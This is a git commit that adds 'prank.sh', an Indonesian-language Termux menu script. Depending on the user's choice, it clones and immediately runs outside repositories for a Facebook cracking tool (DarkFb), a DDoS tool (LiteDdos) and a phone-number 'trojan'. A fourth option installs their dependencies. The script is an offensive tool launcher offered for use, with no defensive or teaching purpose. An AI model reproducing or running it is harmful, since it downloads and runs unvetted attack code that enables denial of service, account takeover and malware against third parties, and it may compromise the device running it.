a298f52452ee6ddc4d24665e5f99e1dadec6ddf4
4DM1NH <66303775+4DM1NH@users.noreply.github.com>
2020-06-03 01:03:27 +0700

    Add files via upload

---
+++ prank.sh
@@ -0,0 +1,52 @@
+#!/system/bin/sh
+# Prank link github
+clear
+echo
+sleep 1
+figlet "Tools"
+sleep 1
+echo "===================================="
+echo " Author : 4DM1NH"
+echo " Github : https://github.com/4DM1NH"
+echo "===================================="
+echo
+sleep 1
+echo "Dipilih Gan"
+echo "[1] DarkFb"
+echo "[2] LiteDdos"
+echo "[3] Trojan Nomor Hp"
+echo "[4] Download Bahannya"
+read -p "[?] Pilih : " pil :
+# Batas gan
+if [ $pil = 1 ]
+then
+git clone https://github.com/4DM1NH/DarkFbv2
+cd DarkFbv2
+python2 D4RKFBv2.py
+fi
+# Batas gan
+if [ $pil = 2 ]
+then
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 LITEDDOS.py
+fi
+# Batas gan
+if [ $pil = 3 ]
+then
+git clone https://github.com/R133F/Trojans
+cd Trojans
+python2 trojans.py
+fi
+# Batas gan
+if [ $pil = 4 ]
+then
+apt update && apt upgrade
+pkg install nano
+pkg install python
+pkg install php
+pkg install git
+pkg install python2
+pip install requests mechanize
+pip2 install requests mechanize
+fi
